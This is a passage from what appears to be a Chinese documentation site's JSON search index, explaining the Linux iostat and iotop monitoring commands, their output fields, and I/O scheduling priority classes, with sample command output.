\"r_await\uff1a\u6bcf\u4e2a\u8bfb\u64cd\u4f5c\u5e73\u5747\u6240\u9700\u7684\u65f6\u95f4\uff1b\u4e0d\u4ec5\u5305\u62ec\u786c\u76d8\u8bbe\u5907\u8bfb\u64cd\u4f5c\u7684\u65f6\u95f4\uff0c\u8fd8\u5305\u62ec\u4e86\u5728kernel\u961f\u5217\u4e2d\u7b49\u5f85\u7684\u65f6\u95f4\" \"w_await\uff1a\u6bcf\u4e2a\u5199\u64cd\u4f5c\u5e73\u5747\u6240\u9700\u7684\u65f6\u95f4\uff1b\u4e0d\u4ec5\u5305\u62ec\u786c\u76d8\u8bbe\u5907\u5199\u64cd\u4f5c\u7684\u65f6\u95f4\uff0c\u8fd8\u5305\u62ec\u4e86\u5728kernel\u961f\u5217\u4e2d\u7b49\u5f85\u7684\u65f6\u95f4\" \"svctm\uff1a\u5e73\u5747\u6bcf\u6b21\u8bbe\u5907I/O\u64cd\u4f5c\u7684\u670d\u52a1\u65f6\u95f4 (\u6beb\u79d2) \"%util\uff1a \u5728\u7edf\u8ba1\u65f6\u95f4\u5185\u6240\u6709\u5904\u7406IO\u65f6\u95f4\uff0c\u9664\u4ee5\u603b\u5171\u7edf\u8ba1\u65f6\u95f4\u3002\u4f8b\u5982\uff0c\u5982\u679c\u7edf\u8ba1\u95f4\u96941\u79d2\uff0c\u8be5\u8bbe\u5907\u67090.8\u79d2\u5728\u5904\u7406IO\uff0c\u800c0.2\u79d2\u95f2\u7f6e\uff0c\u90a3\u4e48\u8be5\u8bbe\u5907\u7684%util = 0.8/1 = 80%\uff0c\u6240\u4ee5\u8be5\u53c2\u6570\u6697\u793a\u4e86\u8bbe\u5907\u7684\u7e41\u5fd9\u7a0b\u5ea6\" \u522b\u4eba\u4e00\u4e2a\u4e0d\u9519\u7684\u4f8b\u5b50.(I/O \u7cfb\u7edf vs. \u8d85\u5e02\u6392\u961f) \u4e3e\u4e00\u4e2a\u4f8b\u5b50\uff0c\u6211\u4eec\u5728\u8d85\u5e02\u6392\u961f checkout \u65f6\uff0c\u600e\u4e48\u51b3\u5b9a\u8be5\u53bb\u54ea\u4e2a\u4ea4\u6b3e\u53f0\u5462? \u9996\u5f53\u662f\u770b\u6392\u7684\u961f\u4eba\u6570\uff0c5\u4e2a\u4eba\u603b\u6bd420\u4eba\u8981\u5feb\u5427? \u9664\u4e86\u6570\u4eba\u5934\uff0c\u6211\u4eec\u4e5f\u5e38\u5e38\u770b\u770b\u524d\u9762\u4eba\u8d2d\u4e70\u7684\u4e1c\u897f\u591a\u5c11\uff0c\u5982\u679c\u524d\u9762\u6709\u4e2a\u91c7\u8d2d\u4e86\u4e00\u661f\u671f\u98df\u54c1\u7684\u5927\u5988\uff0c\u90a3\u4e48\u53ef\u4ee5\u8003\u8651\u6362\u4e2a\u961f\u6392\u4e86\u3002\u8fd8\u6709\u5c31\u662f\u6536\u94f6\u5458\u7684\u901f\u5ea6\u4e86\uff0c\u5982\u679c\u78b0\u4e0a\u4e86\u8fde \u94b1\u90fd\u70b9\u4e0d\u6e05\u695a\u7684\u65b0\u624b\uff0c\u90a3\u5c31\u6709\u7684\u7b49\u4e86\u3002\u53e6\u5916\uff0c\u65f6\u673a\u4e5f\u5f88\u91cd\u8981\uff0c\u53ef\u80fd 5 \u5206\u949f\u524d\u8fd8\u4eba\u6ee1\u4e3a\u60a3\u7684\u6536\u6b3e\u53f0\uff0c\u73b0\u5728\u5df2\u662f\u4eba\u53bb\u697c\u7a7a\uff0c\u8fd9\u65f6\u5019\u4ea4\u6b3e\u53ef\u662f\u5f88\u723d\u554a\uff0c\u5f53\u7136\uff0c\u524d\u63d0\u662f\u90a3\u8fc7\u53bb\u7684 5 \u5206\u949f\u91cc\u6240\u505a\u7684\u4e8b\u60c5\u6bd4\u6392\u961f\u8981\u6709\u610f\u4e49 (\u4e0d\u8fc7\u6211\u8fd8\u6ca1\u53d1\u73b0\u4ec0\u4e48\u4e8b\u60c5\u6bd4\u6392\u961f\u8fd8\u65e0\u804a\u7684)\u3002 I/O \u7cfb\u7edf\u4e5f\u548c\u8d85\u5e02\u6392\u961f\u6709\u5f88\u591a\u7c7b\u4f3c\u4e4b\u5904: r/s+w/s \u7c7b\u4f3c\u4e8e\u4ea4\u6b3e\u4eba\u7684\u603b\u6570 \u5e73\u5747\u961f\u5217\u957f\u5ea6\uff08avgqu-sz\uff09\u7c7b\u4f3c\u4e8e\u5355\u4f4d\u65f6\u95f4\u91cc\u5e73\u5747\u6392\u961f\u4eba\u7684\u4e2a\u6570 \u5e73\u5747\u670d\u52a1\u65f6\u95f4\uff08svctm\uff09\u7c7b\u4f3c\u4e8e\u6536\u94f6\u5458\u7684\u6536\u6b3e\u901f\u5ea6 \u5e73\u5747\u7b49\u5f85\u65f6\u95f4\uff08await\uff09\u7c7b\u4f3c\u4e8e\u5e73\u5747\u6bcf\u4eba\u7684\u7b49\u5f85\u65f6\u95f4 \u5e73\u5747I/O\u6570\u636e\uff08avgrq-sz\uff09\u7c7b\u4f3c\u4e8e\u5e73\u5747\u6bcf\u4eba\u6240\u4e70\u7684\u4e1c\u897f\u591a\u5c11 I/O \u64cd\u4f5c\u7387\uff08%util\uff09\u7c7b\u4f3c\u4e8e\u6536\u6b3e\u53f0\u524d\u6709\u4eba\u6392\u961f\u7684\u65f6\u95f4\u6bd4\u4f8b\u3002 \u6211\u4eec\u53ef\u4ee5\u6839\u636e\u8fd9\u4e9b\u6570\u636e\u5206\u6790\u51fa I/O \u8bf7\u6c42\u7684\u6a21\u5f0f\uff0c\u4ee5\u53ca I/O \u7684\u901f\u5ea6\u548c\u54cd\u5e94\u65f6\u95f4\u3002 iostat(1) - Linux manual page (man7.org) http://www.360doc.com/content/14/0410/18/13876790_367816565.shtml","title":"iostat"},{"location":"system/linux/IO/iostat/#iostat","text":"","title":"iostat\u547d\u4ee4"},{"location":"system/linux/IO/iostat/#_1","text":"$ iostat -xt 1 1 Linux 3.10.0-1160.45.1.el7.x86_64 (VM-0-16-centos) 05/29/2022 _x86_64_ (4 CPU) 05/29/2022 09:23:14 PM avg-cpu: %user %nice %system %iowait %steal %idle 0.09 0.00 0.12 0.01 0.00 99.79 Device: rrqm/s wrqm/s r/s w/s rkB/s wkB/s avgrq-sz avgqu-sz await r_await w_await svctm %util vda 0.00 0.22 0.02 0.65 0.95 4.77 17.04 0.00 2.24 3.84 2.19 0.57 0.04 vdb 0.00 0.00 0.00 0.00 0.00 0.00 48.89 0.00 0.49 0.49 0.00 0.33 0.00 scd0 0.00 0.00 0.00 0.00 0.00 0.00 7.23 0.00 0.18 0.18 0.00 0.18 0.00 \"iostat\u547d\u4ee4\u8be6\u60c5\" \"%user\uff1aCPU\u5904\u5728\u7528\u6237\u6a21\u5f0f\u4e0b\u7684\u65f6\u95f4\u767e\u5206\u6bd4\u3002\" \"%nice\uff1aCPU\u5904\u5728\u5e26NICE\u503c\u7684\u7528\u6237\u6a21\u5f0f\u4e0b\u7684\u65f6\u95f4\u767e\u5206\u6bd4\u3002\" \"%system\uff1aCPU\u5904\u5728\u7cfb\u7edf\u6a21\u5f0f\u4e0b\u7684\u65f6\u95f4\u767e\u5206\u6bd4\u3002\u6b63\u5e38\u5c0f\u4e8e15%\" \"%iowait\uff1aCPU\u7b49\u5f85\u8f93\u5165\u8f93\u51fa\u5b8c\u6210\u65f6\u95f4\u7684\u767e\u5206\u6bd4\u3002\" \"%steal\uff1a\u7ba1\u7406\u7a0b\u5e8f\u7ef4\u62a4\u53e6\u4e00\u4e2a\u865a\u62df\u5904\u7406\u5668\u65f6\uff0c\u865a\u62dfCPU\u7684\u65e0\u610f\u8bc6\u7b49\u5f85\u65f6\u95f4\u767e\u5206\u6bd4\u3002\" \"%idle\uff1aCPU\u7a7a\u95f2\u65f6\u95f4\u767e\u5206\u6bd4\u3002\" \"rrqm/s\uff1a\u6bcf\u79d2\u8fd9\u4e2a\u8bbe\u5907\u76f8\u5173\u7684\u8bfb\u53d6\u8bf7\u6c42\u6709\u591a\u5c11\u88abMerge\u4e86\uff08\u5f53\u7cfb\u7edf\u8c03\u7528\u9700\u8981\u8bfb\u53d6\u6570\u636e\u7684\u65f6\u5019\uff0cVFS\u5c06\u8bf7\u6c42\u53d1\u5230\u5404\u4e2aFS\uff0c\u5982\u679cFS\u53d1\u73b0\u4e0d\u540c\u7684\u8bfb\u53d6\u8bf7\u6c42\u8bfb\u53d6\u7684\u662f\u76f8\u540cBlock\u7684\u6570\u636e\uff0cFS\u4f1a\u5c06\u8fd9\u4e2a\u8bf7\u6c42\u5408\u5e76Merge\uff09\" \"wrqm/s\uff1a\u6bcf\u79d2\u8fd9\u4e2a\u8bbe\u5907\u76f8\u5173\u7684\u5199\u5165\u8bf7\u6c42\u6709\u591a\u5c11\u88abMerge\u4e86\" \"rsec/s\uff1a\u6bcf\u79d2\u8bfb\u53d6\u7684\u6247\u533a\u6570\" \"wsec/\uff1a\u6bcf\u79d2\u5199\u5165\u7684\u6247\u533a\u6570\" \"r/s\uff1a\u6bcf\u79d2\u5b8c\u6210\u7684\u8bfb\u6b21\u6570\" \"w/s\uff1a\u6bcf\u79d2\u5b8c\u6210\u7684\u5199\u6b21\u6570\" \"avgrq-sz\uff1a\u5e73\u5747\u6bcf\u6b21\u8bbe\u5907I/O\u64cd\u4f5c\u7684\u6570\u636e\u5927\u5c0f (\u6247\u533a)\u3002delta(rsect+wsect)/delta(rio+wio)\" \"avgqu-sz\uff1a\u5e73\u5747I/O\u961f\u5217\u957f\u5ea6\u3002\u5373 delta(aveq)/s/1000 (\u56e0\u4e3aaveq\u7684\u5355\u4f4d\u4e3a\u6beb\u79d2)\u3002\" \u961f\u5217\u957f\u5ea6\uff08avgqu-sz\uff09\u4e5f\u53ef\u4f5c\u4e3a\u8861\u91cf\u7cfb\u7edf I/O \u8d1f\u8377\u7684\u6307\u6807\uff0c\u4f46\u7531\u4e8e avgqu-sz \u662f\u6309\u7167\u5355\u4f4d\u65f6\u95f4\u7684\u5e73\u5747\u503c\uff0c\u6240\u4ee5\u4e0d\u80fd\u53cd\u6620\u77ac\u95f4\u7684 I/O \u6d2a\u6c34\u3002 \"await\uff1a \u5e73\u5747\u6bcf\u6b21\u8bbe\u5907I/O\u64cd\u4f5c\u7684\u7b49\u5f85\u65f6\u95f4 (\u6beb\u79d2)\u3002\u5373 delta(ruse+wuse)/delta(rio+wio)\" \u5e73\u65f6\u5c31\u770bawait\u503c\u5927\u5c0f\uff0c\u51e0\u5343\u6216\u8005\u51e0\u4e07\u78c1\u76d8\u5c31\u662f\u6709\u95ee\u9898 \"r_await\uff1a\u6bcf\u4e2a\u8bfb\u64cd\u4f5c\u5e73\u5747\u6240\u9700\u7684\u65f6\u95f4\uff1b\u4e0d\u4ec5\u5305\u62ec\u786c\u76d8\u8bbe\u5907\u8bfb\u64cd\u4f5c\u7684\u65f6\u95f4\uff0c\u8fd8\u5305\u62ec\u4e86\u5728kernel\u961f\u5217\u4e2d\u7b49\u5f85\u7684\u65f6\u95f4\" \"w_await\uff1a\u6bcf\u4e2a\u5199\u64cd\u4f5c\u5e73\u5747\u6240\u9700\u7684\u65f6\u95f4\uff1b\u4e0d\u4ec5\u5305\u62ec\u786c\u76d8\u8bbe\u5907\u5199\u64cd\u4f5c\u7684\u65f6\u95f4\uff0c\u8fd8\u5305\u62ec\u4e86\u5728kernel\u961f\u5217\u4e2d\u7b49\u5f85\u7684\u65f6\u95f4\" \"svctm\uff1a\u5e73\u5747\u6bcf\u6b21\u8bbe\u5907I/O\u64cd\u4f5c\u7684\u670d\u52a1\u65f6\u95f4 (\u6beb\u79d2) \"%util\uff1a \u5728\u7edf\u8ba1\u65f6\u95f4\u5185\u6240\u6709\u5904\u7406IO\u65f6\u95f4\uff0c\u9664\u4ee5\u603b\u5171\u7edf\u8ba1\u65f6\u95f4\u3002\u4f8b\u5982\uff0c\u5982\u679c\u7edf\u8ba1\u95f4\u96941\u79d2\uff0c\u8be5\u8bbe\u5907\u67090.8\u79d2\u5728\u5904\u7406IO\uff0c\u800c0.2\u79d2\u95f2\u7f6e\uff0c\u90a3\u4e48\u8be5\u8bbe\u5907\u7684%util = 0.8/1 = 80%\uff0c\u6240\u4ee5\u8be5\u53c2\u6570\u6697\u793a\u4e86\u8bbe\u5907\u7684\u7e41\u5fd9\u7a0b\u5ea6\" \u522b\u4eba\u4e00\u4e2a\u4e0d\u9519\u7684\u4f8b\u5b50.(I/O \u7cfb\u7edf vs. \u8d85\u5e02\u6392\u961f) \u4e3e\u4e00\u4e2a\u4f8b\u5b50\uff0c\u6211\u4eec\u5728\u8d85\u5e02\u6392\u961f checkout \u65f6\uff0c\u600e\u4e48\u51b3\u5b9a\u8be5\u53bb\u54ea\u4e2a\u4ea4\u6b3e\u53f0\u5462? \u9996\u5f53\u662f\u770b\u6392\u7684\u961f\u4eba\u6570\uff0c5\u4e2a\u4eba\u603b\u6bd420\u4eba\u8981\u5feb\u5427? \u9664\u4e86\u6570\u4eba\u5934\uff0c\u6211\u4eec\u4e5f\u5e38\u5e38\u770b\u770b\u524d\u9762\u4eba\u8d2d\u4e70\u7684\u4e1c\u897f\u591a\u5c11\uff0c\u5982\u679c\u524d\u9762\u6709\u4e2a\u91c7\u8d2d\u4e86\u4e00\u661f\u671f\u98df\u54c1\u7684\u5927\u5988\uff0c\u90a3\u4e48\u53ef\u4ee5\u8003\u8651\u6362\u4e2a\u961f\u6392\u4e86\u3002\u8fd8\u6709\u5c31\u662f\u6536\u94f6\u5458\u7684\u901f\u5ea6\u4e86\uff0c\u5982\u679c\u78b0\u4e0a\u4e86\u8fde \u94b1\u90fd\u70b9\u4e0d\u6e05\u695a\u7684\u65b0\u624b\uff0c\u90a3\u5c31\u6709\u7684\u7b49\u4e86\u3002\u53e6\u5916\uff0c\u65f6\u673a\u4e5f\u5f88\u91cd\u8981\uff0c\u53ef\u80fd 5 \u5206\u949f\u524d\u8fd8\u4eba\u6ee1\u4e3a\u60a3\u7684\u6536\u6b3e\u53f0\uff0c\u73b0\u5728\u5df2\u662f\u4eba\u53bb\u697c\u7a7a\uff0c\u8fd9\u65f6\u5019\u4ea4\u6b3e\u53ef\u662f\u5f88\u723d\u554a\uff0c\u5f53\u7136\uff0c\u524d\u63d0\u662f\u90a3\u8fc7\u53bb\u7684 5 \u5206\u949f\u91cc\u6240\u505a\u7684\u4e8b\u60c5\u6bd4\u6392\u961f\u8981\u6709\u610f\u4e49 (\u4e0d\u8fc7\u6211\u8fd8\u6ca1\u53d1\u73b0\u4ec0\u4e48\u4e8b\u60c5\u6bd4\u6392\u961f\u8fd8\u65e0\u804a\u7684)\u3002 I/O \u7cfb\u7edf\u4e5f\u548c\u8d85\u5e02\u6392\u961f\u6709\u5f88\u591a\u7c7b\u4f3c\u4e4b\u5904: r/s+w/s \u7c7b\u4f3c\u4e8e\u4ea4\u6b3e\u4eba\u7684\u603b\u6570 \u5e73\u5747\u961f\u5217\u957f\u5ea6\uff08avgqu-sz\uff09\u7c7b\u4f3c\u4e8e\u5355\u4f4d\u65f6\u95f4\u91cc\u5e73\u5747\u6392\u961f\u4eba\u7684\u4e2a\u6570 \u5e73\u5747\u670d\u52a1\u65f6\u95f4\uff08svctm\uff09\u7c7b\u4f3c\u4e8e\u6536\u94f6\u5458\u7684\u6536\u6b3e\u901f\u5ea6 \u5e73\u5747\u7b49\u5f85\u65f6\u95f4\uff08await\uff09\u7c7b\u4f3c\u4e8e\u5e73\u5747\u6bcf\u4eba\u7684\u7b49\u5f85\u65f6\u95f4 \u5e73\u5747I/O\u6570\u636e\uff08avgrq-sz\uff09\u7c7b\u4f3c\u4e8e\u5e73\u5747\u6bcf\u4eba\u6240\u4e70\u7684\u4e1c\u897f\u591a\u5c11 I/O \u64cd\u4f5c\u7387\uff08%util\uff09\u7c7b\u4f3c\u4e8e\u6536\u6b3e\u53f0\u524d\u6709\u4eba\u6392\u961f\u7684\u65f6\u95f4\u6bd4\u4f8b\u3002 \u6211\u4eec\u53ef\u4ee5\u6839\u636e\u8fd9\u4e9b\u6570\u636e\u5206\u6790\u51fa I/O \u8bf7\u6c42\u7684\u6a21\u5f0f\uff0c\u4ee5\u53ca I/O \u7684\u901f\u5ea6\u548c\u54cd\u5e94\u65f6\u95f4\u3002 iostat(1) - Linux manual page (man7.org) http://www.360doc.com/content/14/0410/18/13876790_367816565.shtml","title":"\u5e38\u89c1\u6807\u9898\u663e\u793a"},{"location":"system/linux/IO/iotop/","text":"iotop\u547d\u4ee4 iotop\u76d1\u89c6Linux\u5185\u6838\uff08\u9700\u89812.6.20\u6216\u66f4\u9ad8\u7248\u672c\uff09\u8f93\u51fa\u7684I/O\u4f7f\u7528\u60c5\u51b5\u4fe1\u606f\uff0c\u5e76\u663e\u793a\u7cfb\u7edf\u4e0a\u8fdb\u7a0b\u6216\u7ebf\u7a0b\u7684\u5f53\u524dI/O\u4f7f\u7528\u60c5\u51b5\u8868\u3002 \u8bed\u6cd5\u683c\u5f0f \uff1aiotop [\u53c2\u6570] \u5e38\u7528\u53c2\u6570\uff1a \ufeff \u9009\u9879 --version \u663e\u793a\u7248\u672c\u53f7\u5e76\u9000\u51fa -h, --help \u663e\u793a\u4f7f\u7528\u4fe1\u606f\u5e76\u9000\u51fa -o, --only \u53ea\u663e\u793a\u5b9e\u9645\u6267\u884cI/O\u7684\u8fdb\u7a0b\u6216\u7ebf\u7a0b\uff0c\u800c\u4e0d\u663e\u793a\u6240\u6709\u8fdb\u7a0b\u6216\u7ebf\u7a0b\u3002\u8fd9\u53ef\u4ee5\u901a\u8fc7\u6309o\u6765\u52a8\u6001\u5207\u6362\u3002 -b, --batch \u6253\u5f00\u975e\u4ea4\u4e92\u6a21\u5f0f\u3002\u7528\u4e8e\u8bb0\u5f55\u968f\u65f6\u95f4\u53d8\u5316\u7684I/O\u4f7f\u7528\u60c5\u51b5\u3002 -n NUM, --iter=NUM \u8bbe\u7f6e\u9000\u51fa\u524d\u7684\u8fed\u4ee3\u6b21\u6570\uff08\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4ece\u4e0d\u9000\u51fa\uff09\u3002\u8fd9\u5728\u975e\u4ea4\u4e92\u6a21\u5f0f\u4e0b\u6700\u6709\u7528\u3002 -d SEC, --delay=SEC \u4ee5\u79d2\u4e3a\u5355\u4f4d\u8bbe\u7f6e\u8fed\u4ee3\u4e4b\u95f4\u7684\u5ef6\u8fdf\uff08\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4e3a1\u79d2\uff09\u3002\u63a5\u53d7\u975e\u6574\u6570\u503c\uff0c\u59821.1\u79d2\u3002 -p PID, --pid=PID \u8981\u76d1\u89c6\u7684\u8fdb\u7a0b/\u7ebf\u7a0b\u7684\u5217\u8868\uff08\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5168\u90e8\uff09\u3002 -u USER\uff0c--user=USER \u8981\u76d1\u89c6\u7684\u7528\u6237\u5217\u8868\uff08\u9ed8\u8ba4\u4e3a\u5168\u90e8\uff09 -P\uff0c --processes \u53ea\u663e\u793a\u8fdb\u7a0b\u3002\u901a\u5e38iotop\u663e\u793a\u6240\u6709\u7ebf\u7a0b\u3002 -a\uff0c --accumulated \u663e\u793a\u7d2f\u8ba1I/O\u800c\u4e0d\u662f\u5e26\u5bbd\u3002\u5728\u6b64\u6a21\u5f0f\u4e0b\uff0ciotop\u663e\u793a\u81eaiotop\u542f\u52a8\u4ee5\u6765\u5df2\u5b8c\u6210\u7684I/O\u8fdb\u7a0b\u6570\u3002 -k\uff0c --kilobytes \u4f7f\u7528\u5343\u5b57\u8282\u800c\u4e0d\u662f\u4eba\u7c7b\u53cb\u597d\u7684\u5355\u4f4d\u3002\u5728\u7f16\u5199iotop\u7684\u6279\u5904\u7406\u6a21\u5f0f\u811a\u672c\u65f6\uff0c\u6b64\u6a21\u5f0f\u975e\u5e38\u6709\u7528\u3002iotop\u5c06\u4ee5\u5343\u5b57\u8282\u4e3a\u5355\u4f4d\u663e\u793a\u6240\u6709\u5927\u5c0f\uff0c\u800c\u4e0d\u662f\u9009\u62e9\u6700\u5408\u9002\u7684\u5355\u4f4d\u3002 -t\uff0c --time \u5728\u6bcf\u884c\u4e0a\u6dfb\u52a0\u4e00\u4e2a\u65f6\u95f4\u6233\uff08\u6697\u793a--batch\uff09\u3002\u6bcf\u884c\u7684\u524d\u7f00\u90fd\u662f\u5f53\u524d\u65f6\u95f4\u3002 -q\uff0c --quiet \u6291\u5236\u6807\u9898\u7684\u67d0\u4e9b\u884c\uff08\u6697\u793a--batch\uff09\u3002\u6b64\u9009\u9879\u6700\u591a\u53ef\u4ee5\u6307\u5b9a\u4e09\u6b21\u4ee5\u5220\u9664\u6807\u9898\u884c\u3002 -q \u5217\u540d\u53ea\u5728\u7b2c\u4e00\u6b21\u65f6\u6253\u5370 -qq \u5217\u540d\u4e0d\u6253\u5370 -qqq \u4e0d\u6253\u5370IO\u6458\u8981 \u5e38\u7528\u4f7f\u7528\u65b9\u6cd5 [root@VM-0-16-centos ~]# iotop -otqqq TIME TID PRIO USER DISK READ DISK WRITE SWAPIN IO> COMMAND 16:57:42 6788 be/4 root 0.00 B/s 3.97 K/s 0.00 % 0.00 % barad_agent 16:57:43 12982 be/4 root 0.00 B/s 0.00 B/s 0.00 % 0.02 % [kworker/2:0] 16:57:46 12982 be/4 root 0.00 B/s 0.00 B/s 0.00 % 0.02 % [kworker/2:0] 16:57:47 291 be/3 root 0.00 B/s 23.80 K/s 0.00 % 0.28 % [jbd2/vda1-8] -o \u53ea\u663e\u793a\u6709IO\u7684\u8fdb\u7a0b -t \u663e\u793a\u65f6\u95f4 -qqq \u4e0d\u6253\u5370\u6458\u8981 TID \u7ebf\u7a0b\u53f7 -P\u9009\u9879\u53ef\u4ee5\u4ee5\u8fdb\u7a0b\u663e\u793a DISK READ \u548c DISK WRITE \u662fIO\u901f\u5ea6 SWAPIN\u5c31\u662f \u8fdb\u7a0b\u6216\u8005\u7ebf\u7a0b\u82b1\u8d39\u5728\u4ea4\u6362\u5185\u5b58\u65f6\u95f4\u7684\u767e\u5206\u6bd4 IO \u8fdb\u7a0b\u6216\u8005\u7ebf\u7a0b\u82b1\u8d39\u5728IO\u65f6\u95f4\u7684\u767e\u5206\u6bd4 PRIO \u662fI/O\u4f18\u5148\u7ea7 \u901a\u8fc7ionice -p \u4e5f\u53ef\u4ee5\u67e5\u770b I/O\u4f18\u5148\u7ea7 Class1(RTreal-time)\uff1a\u5b9e\u65f6 \u5b50\u4f18\u7ea70-7\uff0c\u6570\u5b57\u8d8a\u5c0f0\uff08\u6700\u9ad8\uff09\uff0c\u8d8a\u59277\uff08\u6700\u4f4e\uff09 Real time \u8fd9\u4e2a\u8c03\u5ea6\u7ea7\u522b\u7684\u8fdb\u7a0b\u4ea7\u751f\u7684IO\u88ab\u4f18\u5148\u5904\u7406\uff0c\u8fd9\u4e2a\u8c03\u5ea6\u7c7b\u578b\u5e94\u5c0f\u5fc3\u4f7f\u7528\uff0c\u9632\u6b62\u997f\u6b7b\u5176\u4ed6\u8fdb\u7a0bIO, \u5b83\u4e5f\u67098\u4e2a\u4f18\u5148\u7ea7\uff0c\u6570\u5b57\u8d8a\u5927\u5206\u7684\u7684IO\u65f6\u95f4\u7247\u8d8a\u957f Class2(BE best-effort): \u6700\u4f73\u6548\u679c\uff0c\u90fd\u80fd\u8bbf\u95ee \u9ed8\u8ba4 \u5b50\u4f18\u7ea70-7\uff0c\u6570\u5b57\u8d8a\u5c0f0\uff08\u6700\u9ad8\uff09\uff0c\u8d8a\u59277\uff08\u6700\u4f4e\uff09 Best-effort \u8fd9\u4e2a\u7c7b\u578b\u5171\u6709 8 \u4e2a\u4f18\u5148\u7ea7\uff0c\u5206\u522b\u4e3a 0-7\uff0c\u6570\u5b57\u8d8a\u4f4e\uff0c\u4f18\u5148\u7ea7\u8d8a\u9ad8\uff0c\u76f8\u540c\u7ea7\u522b\u7684\u4f18\u5148\u7ea7\u4f7f\u7528\u8f6e\u8be2\u7684\u65b9\u5f0f\u5904\u7406\u3002\u9002\u7528\u4e8e\u666e\u901a\u7684\u8fdb\u7a0b\u3002 \u57282.6.26\u4e4b\u524d\uff0c\u6ca1\u6709\u6307\u5b9a\u8c03\u5ea6\u7c7b\u578b\u7684\u8fdb\u7a0b\u4f7f\u7528\"none\" \u8c03\u5ea6\u7c7b\u578b\uff0cIO\u8c03\u5ea6\u5668\u5c06\u5176\u89c6\u4f5cBest-effort\u8fdb\u884c\u5904\u7406\uff0c\u8fd9\u4e2a\u7c7b\u522b\u4e2d\u8fdb\u7a0b\u4f18\u5148\u7ea7\u7531CPU\u4f18\u5148\u7ea7\u8ba1\u7b97\u5f97\u6765\uff1aio_priority = (cpu_nice + 20) / 5 2.6.26\u4e4b\u540e\uff0c\u6ca1\u6709\u6307\u5b9a\u8c03\u5ea6\u7c7b\u578b\u7684\u8fdb\u7a0b\u5c06\u4eceCPU\u8c03\u5ea6\u7c7b\u578b\u7ee7\u627f\u800c\u6765\uff0c\u8fd9\u4e2a\u7c7b\u522b\u7684\u4f18\u5148\u7ea7\u4ecd\u6309\u7167CPU\u4f18\u5148\u7ea7\u8ba1\u7b97\u800c\u6765\uff1aio_priority = (cpu_nice + 20) / 5 Class3(idle)\uff1a\u7a7a\u95f2 idle \u53ea\u6709\u5728\u6ca1\u6709\u66f4\u9ad8\u4f18\u5148\u7ea7\u7684\u8fdb\u7a0b\u4ea7\u751f IO \u65f6\uff0cidle \u624d\u53ef\u4ee5\u4f7f\u7528\u78c1\u76d8 IO\uff0c\u9002\u7528\u4e8e\u54ea\u4e9b\u4e0d\u91cd\u8981\u7684\u7a0b\u5e8f\uff08\u5982 updatedb\uff09\uff0c\u8ba9\u5b83\u4eec\u5728\u78c1\u76d8\u7a7a\u95f2\u65f6\u518d\u4ea7\u751f IO","title":"iotop"},{"location":"system/linux/IO/iotop/#iotop","text":"iotop\u76d1\u89c6Linux\u5185\u6838\uff08\u9700\u89812.6.20\u6216\u66f4\u9ad8\u7248\u672c\uff09\u8f93\u51fa\u7684I/O\u4f7f\u7528\u60c5\u51b5\u4fe1\u606f\uff0c\u5e76\u663e\u793a\u7cfb\u7edf\u4e0a\u8fdb\u7a0b\u6216\u7ebf\u7a0b\u7684\u5f53\u524dI/O\u4f7f\u7528\u60c5\u51b5\u8868\u3002 \u8bed\u6cd5\u683c\u5f0f \uff1aiotop [\u53c2\u6570]","title":"iotop\u547d\u4ee4"},{"location":"system/linux/IO/iotop/#_1","text":"\u9009\u9879 --version \u663e\u793a\u7248\u672c\u53f7\u5e76\u9000\u51fa -h, --help \u663e\u793a\u4f7f\u7528\u4fe1\u606f\u5e76\u9000\u51fa -o, --only \u53ea\u663e\u793a\u5b9e\u9645\u6267\u884cI/O\u7684\u8fdb\u7a0b\u6216\u7ebf\u7a0b\uff0c\u800c\u4e0d\u663e\u793a\u6240\u6709\u8fdb\u7a0b\u6216\u7ebf\u7a0b\u3002\u8fd9\u53ef\u4ee5\u901a\u8fc7\u6309o\u6765\u52a8\u6001\u5207\u6362\u3002 -b, --batch \u6253\u5f00\u975e\u4ea4\u4e92\u6a21\u5f0f\u3002\u7528\u4e8e\u8bb0\u5f55\u968f\u65f6\u95f4\u53d8\u5316\u7684I/O\u4f7f\u7528\u60c5\u51b5\u3002 -n NUM, --iter=NUM \u8bbe\u7f6e\u9000\u51fa\u524d\u7684\u8fed\u4ee3\u6b21\u6570\uff08\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4ece\u4e0d\u9000\u51fa\uff09\u3002\u8fd9\u5728\u975e\u4ea4\u4e92\u6a21\u5f0f\u4e0b\u6700\u6709\u7528\u3002 -d SEC, --delay=SEC \u4ee5\u79d2\u4e3a\u5355\u4f4d\u8bbe\u7f6e\u8fed\u4ee3\u4e4b\u95f4\u7684\u5ef6\u8fdf\uff08\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4e3a1\u79d2\uff09\u3002\u63a5\u53d7\u975e\u6574\u6570\u503c\uff0c\u59821.1\u79d2\u3002 -p PID, --pid=PID \u8981\u76d1\u89c6\u7684\u8fdb\u7a0b/\u7ebf\u7a0b\u7684\u5217\u8868\uff08\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5168\u90e8\uff09\u3002 -u USER\uff0c--user=USER \u8981\u76d1\u89c6\u7684\u7528\u6237\u5217\u8868\uff08\u9ed8\u8ba4\u4e3a\u5168\u90e8\uff09 -P\uff0c --processes \u53ea\u663e\u793a\u8fdb\u7a0b\u3002\u901a\u5e38iotop\u663e\u793a\u6240\u6709\u7ebf\u7a0b\u3002 -a\uff0c --accumulated \u663e\u793a\u7d2f\u8ba1I/O\u800c\u4e0d\u662f\u5e26\u5bbd\u3002\u5728\u6b64\u6a21\u5f0f\u4e0b\uff0ciotop\u663e\u793a\u81eaiotop\u542f\u52a8\u4ee5\u6765\u5df2\u5b8c\u6210\u7684I/O\u8fdb\u7a0b\u6570\u3002 -k\uff0c --kilobytes \u4f7f\u7528\u5343\u5b57\u8282\u800c\u4e0d\u662f\u4eba\u7c7b\u53cb\u597d\u7684\u5355\u4f4d\u3002\u5728\u7f16\u5199iotop\u7684\u6279\u5904\u7406\u6a21\u5f0f\u811a\u672c\u65f6\uff0c\u6b64\u6a21\u5f0f\u975e\u5e38\u6709\u7528\u3002iotop\u5c06\u4ee5\u5343\u5b57\u8282\u4e3a\u5355\u4f4d\u663e\u793a\u6240\u6709\u5927\u5c0f\uff0c\u800c\u4e0d\u662f\u9009\u62e9\u6700\u5408\u9002\u7684\u5355\u4f4d\u3002 -t\uff0c --time 